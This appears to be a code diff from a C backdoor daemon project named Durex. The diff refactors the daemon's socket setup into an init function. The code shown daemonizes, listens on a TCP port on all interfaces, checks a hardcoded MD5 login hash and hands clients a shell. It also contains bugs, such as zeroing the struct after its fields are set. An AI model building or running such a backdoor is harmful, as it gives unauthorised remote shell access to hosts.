@@ -2,6 +2,35 @@
 
 t_ctx durex;
 
+static void		_init(void)
+{
+	int opt = 1;
+	durex.mport = PORT;
+	durex.rsock.sin_family = AF_INET;
+	durex.rsock.sin_addr.s_addr = htonl(INADDR_ANY);
+
+	memset(&durex, 0, sizeof(durex));
+	if ((durex.io = open("/tmp/Durex.log", O_RDWR | O_CREAT)) < 0)
+		exit(1);
+	if ((durex.msock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+		exit(1);
+	if ((setsockopt(durex.msock,  SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) < 0)
+		exit(1);
+	durex.rsock.sin_port = htons(durex.mport);
+	if (bind(durex.msock, (struct sockaddr *)&durex.rsock,
+		sizeof(durex.rsock)) == -1)
+		_exit(1);
+	if (listen(durex.msock, MAXCLIENTS) < 0)
+		_exit(1);
+	for (opt = MAXCLIENTS; opt > 0; opt--)
+	{
+		durex.client[opt].status = WAITING;
+		durex.client[opt].fd = -1;
+		durex.client[opt].pid = -1;
+	}
+	_sighandler();
+}
+
 static int		_login(char *key)
 {
 	char mdfive[32] = "63a9f0ea7bb98050796b649e85481845";
@@ -63,7 +92,6 @@ void		_rundurex(char **envp)
 	struct timeval tv;
 	int retval;
 	int i, client_nb = 0;
-	int opt = 1;
 	int sockmax;
 	int tmp_socket = 9999;
 	struct sockaddr_in client_sin;
@@ -71,29 +99,7 @@ void		_rundurex(char **envp)
 
 	if (daemon(0,0) < 0)
 		exit(1);
-	durex.mport = PORT;
-	durex.rsock.sin_family = AF_INET;
-	durex.rsock.sin_addr.s_addr = htonl(INADDR_ANY);
-	memset(&durex, 0, sizeof(durex));
-	if ((durex.io = open("/tmp/Durex.log", O_RDWR | O_CREAT)) < 0)
-		exit(1);
-	if ((durex.msock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
-		exit(1);
-	if ((setsockopt(durex.msock,  SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) < 0)
-		exit(1);
-	durex.rsock.sin_port = htons(durex.mport);
-	if (bind(durex.msock, (struct sockaddr *)&durex.rsock,
-		sizeof(durex.rsock)) == -1)
-		_exit(1);
-	if (listen(durex.msock, MAXCLIENTS) < 0)
-		_exit(1);
-	for (opt = MAXCLIENTS; opt > 0; opt--)
-	{
-		durex.client[opt].status = WAITING;
-		durex.client[opt].fd = -1;
-		durex.client[opt].pid = -1;
-	}
-	_sighandler();
+	_init();
 	sockmax = durex.msock;
 	while (1)
 	{
@@ -136,10 +142,7 @@ void		_rundurex(char **envp)
 			while (i < MAXCLIENTS)
 			{
 				if (durex.client[i].pid > 0)
-				{
-					if (kill(durex.client[i].pid, 0) == -1)
-						durex.client[i].status = LOGGED;
-				}
+					_shchk(&durex.client[i]);
 				if (durex.client[i].status != IN_SHELL)
 				{
 					if (FD_ISSET(durex.client[i].fd, &durex.stream))
